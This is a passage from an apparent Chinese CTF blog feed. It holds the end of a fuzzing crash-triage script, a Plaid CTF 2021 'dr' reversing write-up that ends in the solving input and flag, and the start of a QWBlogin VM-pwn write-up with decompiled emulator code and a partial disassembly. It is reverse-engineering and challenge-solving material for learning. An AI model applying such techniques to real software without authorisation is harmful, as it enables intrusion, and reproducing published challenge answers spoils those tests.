&quot;HBO&quot;else:crash &#x3D; &quot;UNKNOWN&quot;if crash &#x3D;&#x3D; &quot;HBO&quot;:output &#x3D; output.split(&quot;\n&quot;)counter &#x3D; 0while counter &lt; len(output):if output[counter] &#x3D;&#x3D; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;:target_line &#x3D; output[counter + 1]target_line2 &#x3D; output[counter + 2]counter +&#x3D; 1else:counter +&#x3D; 1target_line &#x3D; target_line.split(&quot; &quot;)address &#x3D; target_line[5].replace(&quot;0x&quot;,&quot;&quot;)target_line2 &#x3D; target_line2.split(&quot; &quot;)operation &#x3D; target_line2[0]elif crash &#x3D;&#x3D; &quot;SEGV&quot;:output &#x3D; output.split(&quot;\n&quot;)counter &#x3D; 0while counter &lt; len(output):if output[counter] &#x3D;&#x3D; &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;:target_line &#x3D; output[counter + 1]target_line2 &#x3D; output[counter + 2]counter +&#x3D; 1else:counter +&#x3D; 1if &quot;unknown address&quot; in target_line:address &#x3D; &quot;00000000&quot;else:address &#x3D; Noneif &quot;READ&quot; in target_line2:operation &#x3D; &quot;READ&quot;elif &quot;WRITE&quot; in target_line2:operation &#x3D; &quot;WRITE&quot;else:operation &#x3D; Nonelog_name &#x3D; (x.replace(&quot;.jpg&quot;,&quot;&quot;) + &quot;.&quot; + crash + &quot;.&quot; + address + &quot;.&quot; + operation)f &#x3D; open(log_name,&quot;w+&quot;)f.write(original_output)f.close()files &#x3D; get_files()triage_files(files)</code></pre>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Plaid CTF dr</title>
    <link href="/2021/05/10/Plaid%20CTF%20dr/"/>
    <url>/2021/05/10/Plaid%20CTF%20dr/</url>
    
    <content type="html"><![CDATA[<p>打比赛的时候，后面一直在看<code>dr</code>这个题，把大概逻辑逆清楚（<del>后来发现逆向一点用都没，感觉还不如猜呢，tcl，rust逆的很慢</del>），一开始觉得有点类似自动机，后面发现是正则之后，巨神两个小时就秒了（tql</p><p>拖了很久才来复现，稍微记录一下，免得之后忘记了</p><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p> 虽然是 rust 写的，但是程序逻辑比较简单，可以分为三部分，前面第一部分和第三部分都是定死的字符串 “3” 和 “yes”</p><p>第二部分输入的时候会出现一些奇怪的东西，到后面可以发现第二部分算是第四部分的提示</p><p>第二部分输入的是症状，第四部分是输入key，输入症状时，会出现类似自动机吃字符然后出现状态转换的提示，在这部分可以猜到一些最基本的符号表示，同时不同的症状需要的治病的费用不同，对后续的第四部分也会造成影响</p><p>第四部分输入key之后，会进行接受，并在最后将输入的内容和写在bss段的字符列表进行处理之后得到flag</p><h2 id="正则分析"><a href="#正则分析" class="headerlink" title="正则分析"></a>正则分析</h2><p>通过猜名字和对于不同的输入和提示的返回可以得到以下的分析结果</p><pre><code class="hljs"><span class="hljs-attribute">And</span>: 满足Res中所有的要求<span class="hljs-attribute">Alt</span>: 满足Res中其中一个要求<span class="hljs-attribute">Seq</span>: 正则需要满足的序列<span class="hljs-attribute">Lit</span>: 一个一个匹配，字面量<span class="hljs-attribute">Res</span>: 数组<span class="hljs-attribute">Star</span>: 匹配0个或者多个<span class="hljs-attribute">Eps</span>: epsilon<span class="hljs-attribute">Neg(Null)</span>: 匹配任意长度的<span class="hljs-attribute">Neg:</span>    10c -&gt; 10ca    Neg( ... Alt(Res([Lit(&quot;af&quot;)])) ...) -&gt; Neg( ... Alt(Res([Lit(&quot;f&quot;)])) ... )    应该是禁止出现 af 的意思        尝试 10caf 也失效了<span class="hljs-attribute">Consider</span>:     1: 1,7777,73331         0*16+1    10: 16,7777,73331       (0*16+1)*16+0        100: 256,7777,73331     ((0*16+1)*16+0)*16+0    10c: 268,7777,73331     ((0*16+1)*16+0)*16+0xc    %733331    相当于 Consider(Res([])) 的个数进制<span class="hljs-attribute">Moon</span>:     1: Moon([0-9],2,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10: Moon([0-9],3,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    100: Moon([0-9],1,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10c: Moon([a-f],3,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)        相当于在算个数，如果个数相等了，这个 Moon 可以结束进入下一个    100c 这个c就吃不进去，因为第一项是 Moon([0-9], 1, 3)<span class="hljs-attribute">Fan:</span>    10: Neg(.. Fan([a-f], 6) ..)    10b: Neg(.. Fan([a-f], 5) ..)    倒数计数</code></pre><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>最后对照输入<code>1</code>之后的正则提示，可以分析得到以下的结果</p><pre><code class="hljs lsl"><span class="hljs-number">1.</span> Neg(Null) + Consider( [bcd], Lit(<span class="hljs-string">&quot;cdb&quot;</span>)+Neg(bd) ], <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  字符串 []cdb 或者 cdb[] 且不能为 cdbb cdbd<span class="hljs-number">2.</span> *[<span class="hljs-number">1</span><span class="hljs-number">-3</span>] + (*[<span class="hljs-number">3</span><span class="hljs-number">-7</span>] + Neg(Null))                                <span class="hljs-number">3.</span> Consider( [<span class="hljs-number">05</span>a], [<span class="hljs-number">16</span>b], [<span class="hljs-number">27</span>cf], [<span class="hljs-number">38</span>dx], [<span class="hljs-number">49</span>e], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span> )     算法需要 最后 %<span class="hljs-number">7</span> == <span class="hljs-number">0</span><span class="hljs-number">4.</span> Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>) + Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>) + Moon( Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>), Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>), <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)    需要 数字(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+字符(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..)+数字(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+字符(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..) <span class="hljs-number">5.</span> Moon(Lit(<span class="hljs-string">&quot;10&quot;</span>), <span class="hljs-number">0</span>, <span class="hljs-number">3</span>)                                        <span class="hljs-number">10</span>需要出现<span class="hljs-number">3</span>次<span class="hljs-number">6.</span> Neg( Alt( Lit(<span class="hljs-string">&quot;af&quot;</span>), Lit(<span class="hljs-string">&quot;73&quot;</span>), 数字+Lit(<span class="hljs-string">&quot;a&quot;</span>), Lit(<span class="hljs-string">&quot;ccc&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">7</span>) )  )          af <span class="hljs-number">73</span> 数字+a ccc 都不能出现 数字也不能连续超过<span class="hljs-number">7</span>个   Neg( Alt( Lit(<span class="hljs-string">&quot;a&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">6</span>)))                   a 不能出现 数字不能连续超过<span class="hljs-number">6</span>个<span class="hljs-number">7.</span> Neg( Neg(Null) + Fan([a-f]+Neg(Null), <span class="hljs-number">6</span>))                                    字母不能超过<span class="hljs-number">6</span>个<span class="hljs-number">8.</span> Consider(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,a,b,c,d,e,f, <span class="hljs-number">0</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">73331</span>)</code></pre><h2 id="大致推测"><a href="#大致推测" class="headerlink" title="大致推测"></a>大致推测</h2><p>1 4 7得 <code>cdb</code> 的串长度只能为 4且只能为 <code>[b-f]cdb | cdb[cef]</code></p><p>主要4可以知道基本上是<code>数字+字符+数字+字符</code>的模式，又字符不能超过6个且连续的字符必须是1或者4个，因此要么是<code>1+4</code>要么是<code>4+1</code></p><p>再判断一下数字只能是<code>2+2 | 2+5 | 5+2 | 5+5</code>，又需要出现三次<code>10</code>，因此只能<code>[1010x|10x10|10] + [10xxx|x10xx|xx10x|xxx10]</code>或者这两个的顺序可以反过来即前面是一个<code>10</code>后面是两个<code>10</code></p><p> 因此<code>(a, b, c, d)</code>中</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>: <span class="hljs-number">1010</span>x | <span class="hljs-number">10</span>x<span class="hljs-number">10</span> | <span class="hljs-number">10</span><span class="hljs-attribute">b</span>:<span class="hljs-meta"> [b-f]cdb | cbd[cef]</span><span class="hljs-attribute">c</span>: <span class="hljs-number">10</span>xxx | x<span class="hljs-number">10</span>xx | xx<span class="hljs-number">10</span>x | xxx<span class="hljs-number">10</span><span class="hljs-attribute">d</span>: bcd</code></pre><p>且<code>a c</code>可交换，<code>b d</code>可交换，然后必须要<code>10</code>开头，必须要3个<code>10</code>，不能出现<code>73</code>，且两个<code>Consider</code>需要满足</p><p>因此可以写出脚本爆破，最后可以得到一堆可能的解</p><p>最后可行的结果</p><pre><code class="hljs apache"><span class="hljs-attribute">cough</span><span class="hljs-attribute">10174cdbf10810c</span><span class="hljs-attribute">PCTF</span>&#123;a_pr<span class="hljs-number">1</span>m<span class="hljs-number">3</span>_a_day_k<span class="hljs-number">33</span>ps_th<span class="hljs-number">3</span>_D<span class="hljs-number">0</span>ctor_Firmly_Away&#125;</code></pre><p>附上题目和脚本 <a href="https://github.com/Vang3lis/CTF_repo/tree/master/PlaidCTF_2021/dr">dr</a></p><p>我的脚本写的十分的暴力（无限套for循环），巨神写的就很简单</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>reg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWBlogin &amp; GACTF vmpwn</title>
    <link href="/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/"/>
    <url>/2020/09/02/qwblogin%20&amp;%20GACTF%20vmpwn/</url>
    
    <content type="html"><![CDATA[<p>强网杯的一个虚拟机的题目，之前做过虚拟机的题目但是都没做出来，这次打比赛的时候由于有其他的事情，就做了一点就没做了，然后今天把这个题目磨出来了。</p><p>打完 <code>GACTF2020</code> 之后把其中的<code>vmpwn</code>也添加在此</p><h2 id="QWBlogin"><a href="#QWBlogin" class="headerlink" title="QWBlogin"></a>QWBlogin</h2><p>该题给了一个 <code>emulator</code>虚拟机，运行的类似机器码的<code>test.bin</code>和<code>launch.sh</code>，之后<code>tips</code>的时候给了<code>Instruction.h</code></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h4><p>基本上程序运行依靠一个虚拟机的结构体，可以从<code>main</code>里面看到就是 <code>v9</code>结构体，后文会将介绍该结构体</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span></span><span class="hljs-function"></span>&#123;    len = sub_ba0(argv[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">if</span>(len &lt;= <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        fd = open(argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(fd &lt; <span class="hljs-number">0</span>)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        v8 = mmap(<span class="hljs-number">0</span>, len, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, fd, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span>(!v8)        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);        <span class="hljs-comment">// check image format</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(v8, <span class="hljs-string">&quot;\x61\xde\x10\ef&quot;</span>, <span class="hljs-number">4</span>))        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);        <span class="hljs-comment">// check lenth</span>    <span class="hljs-comment">// segment?</span>    <span class="hljs-comment">// v8[6, 14) ~ [14, 22) lenth</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">6</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);        <span class="hljs-comment">// v8[22, 30) ~ [30, 38)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) &gt; len || *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">30</span>) &gt; len - *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">22</span>) )        <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);    <span class="hljs-comment">// v[38, 46) &gt; v8[14, 22)</span>    <span class="hljs-keyword">if</span>( *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">38</span>) &gt;= *(<span class="hljs-keyword">int64_t</span>*)(v8+<span class="hljs-number">14</span>) )         <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);    v9 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0xD0</span>, <span class="hljs-number">1</span>);    <span class="hljs-comment">// v[6, 14) == offset v&#123;14, 22) == segment_size</span>    <span class="hljs-comment">// v9[21] = calloc(1, v8[14, 22)) 0x1000 向上取整</span>    v9[<span class="hljs-number">21</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">21</span>], &amp;(v8[v8[<span class="hljs-number">6</span>, <span class="hljs-number">14</span>)]),  v8[<span class="hljs-number">14</span>, <span class="hljs-number">22</span>))    v[<span class="hljs-number">20</span>] = segment_size;    <span class="hljs-comment">// </span>    v9[<span class="hljs-number">23</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    <span class="hljs-built_in">memcpy</span>(v9[<span class="hljs-number">23</span>], &amp;(v8[v8[<span class="hljs-number">22</span>, <span class="hljs-number">30</span>)]), v8[<span class="hljs-number">30</span>, <span class="hljs-number">38</span>))    v9[<span class="hljs-number">22</span>] = segment_size;     v9[<span class="hljs-number">25</span>] = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>);    v9[<span class="hljs-number">24</span>] = <span class="hljs-number">0x20</span> <span class="hljs-number">000</span>;    v9[<span class="hljs-number">18</span>] = v8[<span class="hljs-number">38</span>, <span class="hljs-number">46</span>)    g_Var = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x18</span>, <span class="hljs-number">1</span>);    <span class="hljs-built_in">memset</span>(g_Var, <span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">//链表结构 可能记录 segment flag 的</span>    <span class="hljs-comment">// g_Var[0x10, 0x18) -&gt; struct_18 -&gt; struct_18;</span>                  <span class="hljs-keyword">while</span>(!sub_c1a(v9))    &#123;&#125;&#125;</code></pre><p>然后进入<code>c1a</code>结构体的时候，会发现<code>IDA</code>报出该函数太大无法分析，只能另外用<code>Ghidra</code>看能不能分析，然后发现能够反编译，于是对其进行<code>dump</code>反编译的文本进行分析</p><h4 id="VM-struct"><a href="#VM-struct" class="headerlink" title="VM struct"></a>VM struct</h4><p>其中关键的结构体被逆出来是如下</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-keyword">int64_t</span> r00;    <span class="hljs-keyword">int64_t</span> r01;    <span class="hljs-keyword">int64_t</span> r02;    <span class="hljs-keyword">int64_t</span> r03;    <span class="hljs-keyword">int64_t</span> r04;    <span class="hljs-keyword">int64_t</span> r05;    <span class="hljs-keyword">int64_t</span> r06;    <span class="hljs-keyword">int64_t</span> r07;    <span class="hljs-keyword">int64_t</span> r08;    <span class="hljs-keyword">int64_t</span> r09;    <span class="hljs-keyword">int64_t</span> r0a;    <span class="hljs-keyword">int64_t</span> r0b;    <span class="hljs-keyword">int64_t</span> r0c;    <span class="hljs-keyword">int64_t</span> r0d;    <span class="hljs-keyword">int64_t</span> r0e;    <span class="hljs-keyword">int64_t</span> r0f;    <span class="hljs-keyword">int64_t</span> r10;    <span class="hljs-keyword">int64_t</span> r11;    <span class="hljs-keyword">int64_t</span> pc;             <span class="hljs-comment">// vm[0x12]</span>    <span class="hljs-keyword">int64_t</span> flags;          <span class="hljs-comment">// vm[0x13]</span>    <span class="hljs-keyword">int64_t</span> text_size;      <span class="hljs-comment">// vm[0x14]</span>    <span class="hljs-keyword">int64_t</span> text_segment;   <span class="hljs-comment">// vm[0x15]</span>    <span class="hljs-keyword">int64_t</span> data_size;      <span class="hljs-comment">// vm[0x16]</span>    <span class="hljs-keyword">int64_t</span> data_segment;   <span class="hljs-comment">// vm[0x17]</span>    <span class="hljs-keyword">int64_t</span> io_file;        <span class="hljs-comment">// 0x18 struct (int_no=0) -&gt; 0x18 (int_no=1) -&gt; 0x18 (int_no=2)</span>    <span class="hljs-keyword">int64_t</span> <span class="hljs-built_in">stack</span>;          <span class="hljs-comment">// vm[0x19]</span>    <span class="hljs-comment">// int64_t </span>&#125;;</code></pre><p>前面是寄存器，后面是一些段和存储的<code>io_file</code>链和虚拟的栈</p><h4 id="op-1"><a href="#op-1" class="headerlink" title="op[1]"></a>op[1]</h4><p>在<code>0xc1a</code>程序的开始先会判断当前<code>op</code>是否<code>&lt;2</code>如果<code>&lt;2</code>则退出，说明每一个指令至少都有两个字节，之后用了<code>op[1]&amp;0xf</code>进行<code>switch case</code>判断当前指令长度</p><pre><code class="hljs c"><span class="hljs-keyword">switch</span> op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xc</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0xe</span>,         <span class="hljs-number">4</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>,        <span class="hljs-number">0xb</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x5</span>:        <span class="hljs-number">0x15</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x25</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">5</span>        <span class="hljs-number">0x35</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">7</span>        <span class="hljs-number">0x45</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">0xb</span>     <span class="hljs-keyword">case</span> <span class="hljs-number">0x6</span>:        <span class="hljs-number">3</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x7</span>:        <span class="hljs-number">0x17</span>: <span class="hljs-keyword">int8_t</span> <span class="hljs-number">3</span>        <span class="hljs-number">0x27</span>: <span class="hljs-keyword">int16_t</span> <span class="hljs-number">4</span>        <span class="hljs-number">0x37</span>: <span class="hljs-keyword">int32_t</span> <span class="hljs-number">6</span>        <span class="hljs-number">0x47</span>: <span class="hljs-keyword">int64_t</span> <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x8</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] == <span class="hljs-number">0x20</span>:            <span class="hljs-number">2</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-number">10</span>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x9</span>:        <span class="hljs-keyword">if</span> op[<span class="hljs-number">0</span>] != <span class="hljs-number">0x20</span> &amp;&amp; a[<span class="hljs-number">0x14</span>] - a[<span class="hljs-number">0x12</span>] &lt; <span class="hljs-number">10</span>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xa</span>:        <span class="hljs-number">2</span>    <span class="hljs-keyword">default</span>:        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</code></pre><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>在最开始的时候傻乎乎的顺着<code>dump</code>的函数逆，后来逆完<code>MOV</code>之后觉得其中<code>MUL/DIV/MOD</code>等一些内容都可以不用逆，然后我让一个学弟帮忙逆<code>XOR/OR/AND</code>等一些其他的，我去逆<code>JMP</code>这整个，后来觉得这个思路错了，其实如果<code>test.bin</code>的程序并没有自我修改的话，其实可以先根据<code>size</code>和<code>instrcution</code>把指令分了，再看是否需要逆一些指令，最后发现只有<code>mov pop push call ret jmp（中间少部分）syacall</code>需要很清楚的逆出来，其他的都可以不用逆。</p><h4 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h4><p>最后需要的每个的情况都整理成如下模式</p><pre><code class="hljs python"><span class="hljs-comment"># 20_syscall.c</span>switch op[<span class="hljs-number">0</span>]:// SYSCALL// size == <span class="hljs-number">2</span>case <span class="hljs-number">0x20</span>:    r00 == <span class="hljs-number">0</span>        op[<span class="hljs-number">1</span>] == <span class="hljs-number">0xa</span>                fd = open(data[r01], r02)        insert fd into vm.io_file    r00 == <span class="hljs-number">1</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            read(r01, data[r02], r03)        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>            read(r01, stack[r02], r03)    r00 == <span class="hljs-number">2</span>        op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x8</span>:            write(r01, data[r02], r03)                op[<span class="hljs-number">1</span>]&amp;<span class="hljs-number">0xf</span> == <span class="hljs-number">0x9</span>:            write(r01, stack[r02], r03)    r00 == <span class="hljs-number">3</span>        close(r01)</code></pre><h4 id="简易-emulator"><a href="#简易-emulator" class="headerlink" title="简易 emulator"></a>简易 emulator</h4><p>最后根据整理的<code>op[0] op[1]</code>进行编写简易的分开<code>test.bin</code>的程序</p><pre><code class="hljs x86asm">ov <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x45</span><span class="hljs-keyword">call</span> <span class="hljs-number">0x45</span> <span class="hljs-number">0x1</span> <span class="hljs-number">0x53</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0xa756f5920656553</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x8</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x23</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x28</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xb</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">dword</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x51</span>|Q<span class="hljs-keyword">je</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>]<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x57</span>| W<span class="hljs-keyword">jne</span> <span class="hljs-number">0x3</span><span class="hljs-keyword">jmp</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> data[<span class="hljs-number">0x40</span>], <span class="hljs-built_in">r9</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">word</span> <span class="hljs-number">0x40</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">syscall</span> data<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span 